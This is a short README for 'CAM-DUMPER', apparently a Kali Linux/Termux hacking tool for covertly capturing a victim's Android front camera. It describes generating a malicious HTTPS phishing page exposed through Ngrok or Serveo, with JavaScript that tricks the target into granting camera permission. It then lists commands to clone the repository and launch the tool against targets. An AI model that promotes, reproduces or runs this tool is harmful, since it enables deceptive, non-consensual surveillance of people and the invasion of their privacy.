# CAM-DUMPER
KALI LINUX / TERMUX tool for hacking victim android front camera.

#How it Works??#
The tool generates a malicious HTTPS page using Serveo or Ngrok Port Forwarding methods, and a javascript code to cam requests using MediaDevices.getUserMedia.

The MediaDevices.getUserMedia() method prompts the user for permission to use a media input which produces a MediaStream with tracks containing the requested types of media. That stream can include, for example, a video track (produced by either a hardware or virtual video source such as a camera, video recording device, screen sharing service, and so forth), an audio track (similarly, produced by a physical or virtual audio source like a microphone, A/D converter, or the like), and possibly other track types.

See more about MediaDEvices.getUserMedia() here

To convince the target to grant permissions to access the cam, the page uses a javascript code made by https://github.com/wybiral that turns the favicon into a cam stream.

#Installing Kali Linux/Termux

>apt update 

>apt upgrade

>pkg install git

>pkg install php

>git clone https://github.com/TermuxHackz/CAM-DUMPER

>cd CAM-DUMPER

>chmod +x camdumper.sh ngrok

>bash camdumper.sh

*Then make your hotspot on and choose ngrok because serveo is down..  BINGO🔥*
_Happy Hacking_
*From the admin*
